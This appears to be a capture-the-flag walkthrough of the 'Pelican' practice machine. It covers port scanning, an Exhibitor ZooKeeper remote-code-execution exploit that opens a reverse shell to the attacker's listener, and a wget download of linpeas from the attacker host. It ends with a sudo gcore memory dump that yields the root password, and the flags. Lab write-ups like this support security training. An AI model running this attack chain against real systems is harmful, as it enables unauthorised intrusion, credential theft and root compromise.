No credentials were provided for this machine

nmap -vvv -T5 -Pn 192.168.164.98 -p- -A -oN nmap.txt

sudo echo "192.168.164.98 pelican.offsec" | sudo tee -a /etc/hosts

http://192.168.164.98:8080/exhibitor/v1/ui/index.html

Exhibitor for ZooKeeper

https://www.exploit-db.com/exploits/48654

https://github.com/thehunt1s0n/Exihibitor-RCE

┌──(lepotekil㉿kali)-[~/proving-ground-prac/pelican/Exihibitor-RCE]
└─$ ./exploit.sh 192.168.164.98 8080 192.168.45.170 5555


------------------------------------------------------------------------------
 _____      _     _ _     _ _              __        __   _       _   _ ___
| ____|_  _| |__ (_) |__ (_) |_ ___  _ __  \ \      / /__| |__   | | | |_ _|
|  _| \ \/ / '_ \| | '_ \| | __/ _ \| '__|  \ \ /\ / / _ \ '_ \  | | | || |
| |___ >  <| | | | | |_) | | || (_) | |      \ V  V /  __/ |_) | | |_| || |
|_____/_/\_\_| |_|_|_.__/|_|\__\___/|_|       \_/\_/ \___|_.__/   \___/|___|

 _  _____ _           ____   ____ _____
/ ||___  / |         |  _ \ / ___| ____|
| |   / /| |  _____  | |_) | |   |  _|
| |_ / /_| | |_____| |  _ <| |___| |___
|_(_)_/(_)_|         |_| \_\____|_____|

------------------------------------------------------------------------------

Original exploit : https://www.exploit-db.com/exploits/48654

----------------This bash script is edited by @thehunt1s0n--------------------

Curl command executed successfully, check your listener.

┌──(lepotekil㉿kali)-[~/proving-ground-prac/pelican/Exihibitor-RCE]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.164.98] 51750
id
uid=1000(charles) gid=1000(charles) groups=1000(charles)
python -c 'import pty; pty.spawn("/bin/bash")'
charles@pelican:/opt/zookeeper$ export SHELL=bash
export SHELL=bash
charles@pelican:/opt/zookeeper$ export TERM=xterm
export TERM=xterm
charles@pelican:/opt/zookeeper$ stty rows 38 columns 116
stty rows 38 columns 116

python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm && stty rows 38 columns 116

charles@pelican:/opt/zookeeper$
charles@pelican:/opt/zookeeper$ cd
cd
charles@pelican:~$ ls
ls
local.txt
charles@pelican:~$ cat local.txt
cat local.txt
80bc8b92f18593b8b9965ec20097efce
charles@pelican:~$ sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore

charles@pelican:~$ wget http://192.168.45.170:8000/linpeas.sh
wget http://192.168.45.170:8000/linpeas.sh
--2025-10-19 12:18:44--  http://192.168.45.170:8000/linpeas.sh
Connecting to 192.168.45.170:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971820 (949K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                   100%[==============================================>] 949.04K  3.83MB/s    in 0.2s    

2025-10-19 12:18:44 (3.83 MB/s) - ‘linpeas.sh’ saved [971820/971820]

charles@pelican:~$ chmod +x linpeas.sh
chmod +x linpeas.sh
charles@pelican:~$ ./linpeas.sh
./linpeas.sh

charles@pelican:~$ sudo gcore 490                                  
sudo gcore 490
0x00007fec7ea386f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffd84db2450, remaining=remaining@entry=0x7ffd84db2450) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.490
[Inferior 1 (process 490) detached]

strings core.490

001 Password: root:
ClogKingpinInning731

charles@pelican:~$ su
su
Password: ClogKingpinInning731

root@pelican:/home/charles# cd
cd
root@pelican:~# ls
ls
Desktop  Documents  Downloads  Music  Pictures  proof.txt  Public  Templates  Videos
root@pelican:~# cat proof.txt
cat proof.txt
b1a3504b8da914e7e54badb0c522b57d